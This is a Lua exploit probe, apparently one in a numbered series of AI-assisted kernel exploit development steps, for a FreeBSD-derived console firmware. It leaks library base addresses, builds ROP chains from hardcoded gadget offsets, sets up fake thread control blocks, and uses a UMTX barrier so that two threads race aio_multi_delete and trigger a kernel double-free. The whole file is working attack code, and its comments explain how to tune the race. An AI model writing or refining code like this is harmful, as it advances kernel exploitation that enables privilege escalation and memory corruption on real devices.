-- CRASH_CLASS: HIGH
-- PROBE 555i: barrier-synchronized dual child race for aio_multi_delete
--
-- 555h showed dual children are serialized: A always finishes before B starts.
-- Root cause: same-core FIFO scheduling.
--
-- Fix: UMTX barrier. Both children block on go_flag via UMTX_OP_WAIT(3).
-- Main yields to let both children start and block, then releases them
-- simultaneously via UMTX_OP_WAKE(4). Both wake and race into delete.
--
-- Key: 555g used op=5 (MUTEX_LOCK), not op=3 (WAIT). CLAUDE.md confirms
-- UMTX_OP_WAIT(3) blocks correctly on value match (probe 152k).
-- From ROP: _umtx_op needs 5 args but uaddr1(rcx)=NULL means kernel
-- ignores uaddr2(r8), so 4-arg ROP is safe.

print("=== PROBE 555i: BARRIER RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc20  = mk(20)
local sc6   = mk(6)
local sc135 = mk(135)
local sc331 = mk(331)
local sc454 = mk(454)
local sc455 = mk(455)
local sc477 = mk(477)
local sc669 = mk(669)
local sc662 = mk(662)
local sc664 = mk(664)
local sc666 = mk(666)

local pid = N(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local pop_rcx   = eb + uint64(0xE64)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

local BATCH  = 32
local ROUNDS = 200

-- Shared memory layout:
-- +0x000: done_A
-- +0x004: done_B
-- +0x008: go_flag (barrier — children wait until main sets to 1 and wakes)
-- +0x010: IDs (BATCH*4 = 128 bytes)
-- +0x200: errs_A (BATCH*4)
-- +0x400: errs_B (BATCH*4)
local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
print("shared=" .. q(shared))
local sn = N(shared)

local done_A   = sn + 0x000
local done_B   = sn + 0x004
local go_flag  = sn + 0x008
local ids_addr = sn + 0x010
local errs_A   = sn + 0x200
local errs_B   = sn + 0x400

-- Fake TCB
local ok_tcb, tcb_page = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
for i = 0, 0x100, 8 do wq(tcb_page + i, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Stack A
local ok_sa, stack_A = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local rsp_A = N(stack_A) + 0x100000 - 8

-- Stack B
local ok_sb, stack_B = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local rsp_B = N(stack_B) + 0x100000 - 8

local function build_chain_at(rsp_val, errs_ptr, done_ptr, done_marker)
    local pos = 0
    local function emit(v) wq(uint64(rsp_val + pos), v); pos = pos + 8 end

    -- sysarch(165, 129, &tcb_ptr)
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- _umtx_op(&go_flag, UMTX_OP_WAIT=3, val=0, uaddr1=NULL)
    -- If *go_flag == 0, block. If *go_flag != 0, return EWOULDBLOCK.
    -- rcx=0 (NULL timeout = block forever), r8 = garbage but kernel ignores
    emit(pop_rdi); emit(uint64(go_flag))
    emit(pop_rsi); emit(uint64(3))      -- UMTX_OP_WAIT
    emit(pop_rdx); emit(Z)              -- expected value = 0
    emit(pop_rcx); emit(Z)              -- uaddr1 = NULL (no timeout)
    emit(pop_rax); emit(uint64(454))    -- _umtx_op
    emit(fn_addr)

    -- aio_multi_delete(662)
    emit(pop_rdi); emit(uint64(ids_addr))
    emit(pop_rsi); emit(uint64(BATCH))
    emit(pop_rdx); emit(uint64(errs_ptr))
    emit(pop_rax); emit(uint64(662))
    emit(fn_addr)

    -- done marker
    emit(pop_rax); emit(uint64(done_marker))
    emit(pop_rdi); emit(uint64(done_ptr))
    emit(mov_m_rax)

    -- thr_exit(431)
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)

    return pos
end

-- thr_params
local tp_A = memory.alloc(0x40); zero(tp_A, 0x40)
wq(tp_A, bare_ret)
wq(tp_A + 0x10, stack_A)
wq(tp_A + 0x18, uint64(0x100008))

local tp_B = memory.alloc(0x40); zero(tp_B, 0x40)
wq(tp_B, bare_ret)
wq(tp_B + 0x10, stack_B)
wq(tp_B + 0x18, uint64(0x100008))

-- Reusable buffers
local sv      = memory.alloc(16)
local scratch = memory.alloc(0x1000)
local reqs    = memory.alloc(BATCH * 0x28 + 16)
local ids_tmp = memory.alloc(BATCH * 4 + 16)
local cst     = memory.alloc(BATCH * 4 + 16)
local poll_st = memory.alloc(BATCH * 4 + 16)

-- ============================================================
-- First: verify UMTX_OP_WAIT(3) actually blocks from main thread
-- ============================================================
print("\n--- UMTX BARRIER TEST ---")
local test_flag = memory.alloc(8)
wq(test_flag, Z)  -- value = 0

-- Should block briefly then timeout... but we have no timeout from Lua either (5 args).
-- Actually from Lua we CAN pass 5 args:
-- _umtx_op(addr, op=3, val=0, uaddr1=&ts, uaddr2=sizeof_ts)
local ts_buf = memory.alloc(16)
wq(ts_buf, Z)                    -- tv_sec = 0
wq(ts_buf + 8, uint64(100000))   -- tv_nsec = 100μs

local t0 = os.clock and os.clock() or 0
local ok_w, rv_w = pcall(function()
    return sc454(uint64(N(test_flag)), uint64(3), Z,
        uint64(N(ts_buf)), uint64(16))
end)
local t1 = os.clock and os.clock() or 0
print(string.format("umtx_wait(op=3, 100μs): rv=%s dt=%.1fms",
    ok_w and tostring(N(rv_w)) or "crash", (t1 - t0) * 1000))

-- Test with value mismatch (should return immediately)
wd(test_flag, 1)
t0 = os.clock and os.clock() or 0
local ok_m, rv_m = pcall(function()
    return sc454(uint64(N(test_flag)), uint64(3), Z,
        uint64(N(ts_buf)), uint64(16))
end)
t1 = os.clock and os.clock() or 0
print(string.format("umtx_wait(mismatch): rv=%s dt=%.1fms",
    ok_m and tostring(N(rv_m)) or "crash", (t1 - t0) * 1000))

-- Test UMTX_OP_WAKE
wd(test_flag, 0)
local ok_wk, rv_wk = pcall(function()
    return sc454(uint64(N(test_flag)), uint64(4), uint64(0x7FFFFFFF), Z, Z)
end)
print(string.format("umtx_wake: rv=%s", ok_wk and tostring(N(rv_wk)) or "crash"))

-- ============================================================
-- Build chains (must rebuild each round because stacks are reused)
-- ============================================================
local sz_A = build_chain_at(rsp_A, errs_A, done_A, 0xAAAA)
local sz_B = build_chain_at(rsp_B, errs_B, done_B, 0xBBBB)
print(string.format("\nchains: A=%dB B=%dB", sz_A, sz_B))
print(string.format("Racing %d rounds, batch=%d (barrier model)\n", ROUNDS, BATCH))

local total_wins = 0
local a_clean = 0
local b_clean = 0
local mixed = 0
local timeouts = 0

for round = 1, ROUNDS do
    local fds_r = {}
    local fds_w = {}
    local ok_sp = true
    for i = 1, BATCH do
        local ok, v = pcall(function()
            return sc135(uint64(1), uint64(1), Z, uint64(N(sv)))
        end)
        if ok and N(v) >= 0 then
            fds_r[i] = rd(sv)
            fds_w[i] = rd(sv + 4)
        else
            ok_sp = false; break
        end
    end

    if ok_sp then
        -- Submit AIO
        for i = 0, BATCH - 1 do
            local base = reqs + i * 0x28
            wq(base + 0x00, Z)
            wq(base + 0x08, uint64(0x1000))
            wq(base + 0x10, uint64(N(scratch)))
            wq(base + 0x18, Z)
            wd(base + 0x20, fds_r[i + 1])
            wd(base + 0x24, 0)
        end
        for i = 0, BATCH - 1 do wd(ids_tmp + i * 4, 0) end
        pcall(function()
            sc669(uint64(0x1001), uint64(N(reqs)), uint64(BATCH),
                uint64(3), uint64(N(ids_tmp)))
        end)

        -- Cancel + close peers → terminal
        pcall(function()
            sc666(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(cst)))
        end)
        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_w[i])) end)
        end

        -- Poll terminal
        local all_term = false
        for try = 1, 100 do
            pcall(function()
                sc664(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(poll_st)))
            end)
            all_term = true
            for i = 0, BATCH - 1 do
                local s = rd(poll_st + i * 4)
                if not s or s < 3 then all_term = false; break end
            end
            if all_term then break end
        end

        if all_term then
            -- Setup shared memory
            for i = 0, BATCH - 1 do
                wd(ids_addr + i * 4, rd(ids_tmp + i * 4) or 0)
                wd(errs_A + i * 4, 0x77777777)
                wd(errs_B + i * 4, 0x77777777)
            end
            wd(done_A, 0)
            wd(done_B, 0)
            wd(go_flag, 0)  -- barrier closed

            -- Launch both children (they'll block on go_flag via umtx_wait)
            pcall(function() sc455(uint64(N(tp_A)), uint64(0x38)) end)
            pcall(function() sc455(uint64(N(tp_B)), uint64(0x38)) end)

            -- Yield to let children start and block on barrier
            for y = 1, 10 do
                pcall(function() sc331() end)
            end

            -- Release barrier: set go_flag=1, wake all waiters
            wd(go_flag, 1)
            pcall(function()
                sc454(uint64(go_flag), uint64(4), uint64(0x7FFFFFFF), Z, Z)
            end)

            -- Yield to let children complete
            for y = 1, 20 do
                pcall(function() sc331() end)
                local da = rd(done_A) or 0
                local db = rd(done_B) or 0
                if da ~= 0 and db ~= 0 then break end
            end

            local da_ok = (rd(done_A) or 0) == 0xAAAA
            local db_ok = (rd(done_B) or 0) == 0xBBBB
            if not da_ok or not db_ok then
                timeouts = timeouts + 1
                if round <= 5 then
                    print(string.format("R%d: timeout A=%s B=%s",
                        round, tostring(da_ok), tostring(db_ok)))
                end
            end

            -- Analyze
            local win_count = 0
            local a_ok = 0
            local b_ok = 0
            for i = 0, BATCH - 1 do
                local ea = rd(errs_A + i * 4) or 0x77777777
                local eb_v = rd(errs_B + i * 4) or 0x77777777
                if ea == 0 and eb_v == 0 then win_count = win_count + 1 end
                if ea == 0 then a_ok = a_ok + 1 end
                if eb_v == 0 then b_ok = b_ok + 1 end
            end

            if win_count > 0 then
                total_wins = total_wins + win_count
                print(string.format("R%d: *** DOUBLE-FREE %d/%d ***", round, win_count, BATCH))
                -- Dump first few error pairs for analysis
                if total_wins <= 64 then
                    for i = 0, 3 do
                        local ea = rd(errs_A + i * 4) or 0
                        local eb_v = rd(errs_B + i * 4) or 0
                        print(string.format("  [%d] A=0x%X B=0x%X", i, ea, eb_v))
                    end
                end
            end

            if a_ok == BATCH then a_clean = a_clean + 1
            elseif b_ok == BATCH then b_clean = b_clean + 1
            elseif a_ok > 0 and b_ok > 0 then mixed = mixed + 1
            end

            if round % 25 == 0 then
                print(string.format("  r=%d w=%d A=%d B=%d mx=%d to=%d",
                    round, total_wins, a_clean, b_clean, mixed, timeouts))
            end
        end

        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_r[i])) end)
        end
    end
end

print("")
local pid2 = N(sc20())
print(string.format("TOTAL: r=%d wins=%d A=%d B=%d mixed=%d to=%d pid=%d%s",
    ROUNDS, total_wins, a_clean, b_clean, mixed, timeouts, pid2,
    pid2 == pid and " OK" or " CHANGED"))

if total_wins > 0 then
    print(">>> DOUBLE-FREE CONFIRMED ON 14.10 <<<")
elseif mixed > 0 then
    print("interleaving detected (" .. mixed .. " rounds) — race window exists but narrow")
else
    local winner = a_clean > b_clean and "A" or "B"
    print("no interleaving — " .. winner .. " always wins")
    if timeouts > ROUNDS / 2 then
        print("high timeouts suggest children stuck on barrier (umtx_wait broken from ROP?)")
    end
end
print("=== 555i DONE ===")
